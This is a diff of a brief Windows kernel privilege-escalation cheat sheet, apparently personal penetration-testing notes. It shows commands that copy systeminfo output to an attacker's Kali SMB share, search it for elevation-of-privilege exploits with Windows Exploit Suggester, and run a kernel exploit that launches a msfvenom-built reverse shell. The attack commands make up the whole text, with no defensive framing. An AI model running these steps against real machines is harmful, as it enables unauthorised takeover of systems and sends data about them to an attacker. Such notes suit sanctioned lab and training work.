@@ -1,6 +1,8 @@
 Kernel Exploit:
 
-systeminfo > \\ip\sharename\systeminfo.txt   ---> to send it to kali in smb share
+systeminfo > \\ip\sharename\systeminfo.txt                                                               ---> to send it to kali in smb share
 
-python widowsexploitsuggester.py systeminfo.txt -i 'Elevationof Privilege' --exploits-only | more
+python widowsexploitsuggester.py systeminfo.txt -i 'Elevationof Privilege' --exploits-only | more        ---> search for kernel exploit using windows exploit suggester
+
+.\kernelexploit.exe C:\PrivEsc\reverse.exe                                                               ---> run exploit which reverse created using msfveom
 
